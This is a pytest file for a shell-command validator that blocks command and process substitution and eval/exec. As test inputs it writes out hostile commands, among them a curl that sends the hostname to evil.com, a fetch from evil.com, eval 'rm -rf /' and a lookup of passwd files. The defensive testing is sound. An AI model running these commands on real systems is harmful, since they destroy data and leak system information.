"""Tests for dangerous constructs validation.

This test suite verifies that validator.py properly calls parser.has_dangerous_constructs()
to detect command substitution, process substitution, and eval/exec commands.

Bug Fix: FIX 1 - Enable has_dangerous_constructs() Detection
The parser had the detection method but validator never called it.
"""

from schlock.core.rules import RiskLevel
from schlock.core.validator import validate_command


class TestCommandSubstitutionBlocked:
    """Test that command substitution $(cmd) is blocked."""

    def test_command_substitution_dollar_paren(self):
        """Command substitution with $() should be blocked."""
        result = validate_command("rm $(whoami)")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED
        assert "substitution" in result.message.lower()
        assert result.exit_code == 1

    def test_command_substitution_backticks(self):
        """Command substitution with backticks should be blocked."""
        result = validate_command("rm `whoami`")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED
        assert "substitution" in result.message.lower()

    def test_command_substitution_nested(self):
        """Nested command substitution should be blocked."""
        result = validate_command("echo $(cat $(find / -name passwd))")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED
        assert "substitution" in result.message.lower()

    def test_command_substitution_in_args(self):
        """Command substitution in arguments should be blocked."""
        result = validate_command("curl http://evil.com/$(hostname)")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED


class TestProcessSubstitutionBlocked:
    """Test that process substitution <(cmd) and >(cmd) is blocked."""

    def test_process_substitution_input(self):
        """Process substitution with <() should be blocked."""
        result = validate_command("cat <(curl http://evil.com)")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED
        assert "substitution" in result.message.lower()

    def test_process_substitution_output(self):
        """Process substitution with >() should be blocked."""
        result = validate_command("diff file.txt >(sort)")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED
        assert "substitution" in result.message.lower()

    def test_process_substitution_multiple(self):
        """Multiple process substitutions should be blocked."""
        result = validate_command("diff <(cat file1) <(cat file2)")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED


class TestEvalExecBlocked:
    """Test that eval and exec commands are blocked."""

    def test_eval_command(self):
        """eval command should be blocked."""
        result = validate_command("eval 'rm -rf /'")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED
        assert "eval" in result.message.lower()

    def test_exec_command(self):
        """exec command should be blocked."""
        result = validate_command("exec bash")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED
        assert "exec" in result.message.lower()

    def test_eval_with_variable(self):
        """eval with variable should be blocked."""
        result = validate_command("cmd='ls -la' && eval $cmd")
        assert not result.allowed
        assert result.risk_level == RiskLevel.BLOCKED


class TestAlternativesProvided:
    """Test that blocked constructs provide helpful alternatives."""

    def test_alternatives_suggest_direct_execution(self):
        """Alternatives should suggest running commands directly."""
        result = validate_command("rm $(find / -name '*.log')")
        assert not result.allowed
        assert len(result.alternatives) > 0
        assert any("directly" in alt.lower() or "explicit" in alt.lower() for alt in result.alternatives)

    def test_alternatives_warn_about_eval(self):
        """Alternatives should warn about eval dangers."""
        result = validate_command("eval 'dangerous command'")
        assert not result.allowed
        assert any("eval" in alt.lower() or "arbitrary" in alt.lower() for alt in result.alternatives)


class TestSafeCommandsNotAffected:
    """Verify that safe commands without dangerous constructs still work."""

    def test_simple_echo_allowed(self):
        """Simple echo without substitution should be allowed."""
        result = validate_command("echo 'hello world'")
        assert result.allowed
        assert result.risk_level != RiskLevel.BLOCKED

    def test_git_status_allowed(self):
        """git status should be allowed."""
        result = validate_command("git status")
        assert result.allowed
        assert result.risk_level == RiskLevel.SAFE

    def test_ls_allowed(self):
        """ls command should be allowed."""
        result = validate_command("ls -la")
        assert result.allowed
        assert result.risk_level == RiskLevel.SAFE


class TestQuotedSubstitutionInStrings:
    """Test that substitution syntax in quoted strings is still blocked.

    Even if the substitution is in a string, it could be executed by eval
    or other dynamic execution. The AST parser will detect the construct
    regardless of context.
    """

    def test_substitution_in_echo_string(self):
        """Command substitution in echo string is still blocked."""
        # This is still dangerous because the string could be eval'd
        result = validate_command("echo 'rm $(whoami)'")
        # Depending on bashlex behavior, this may or may not be detected
        # If detected as commandsubstitution node, it will be blocked
        # This is conservative but safe
        if not result.allowed:
            assert result.risk_level == RiskLevel.BLOCKED
            assert "substitution" in result.message.lower()
        # If bashlex doesn't parse it as substitution (just string), it may pass
        # That's acceptable - the real danger is unquoted substitution
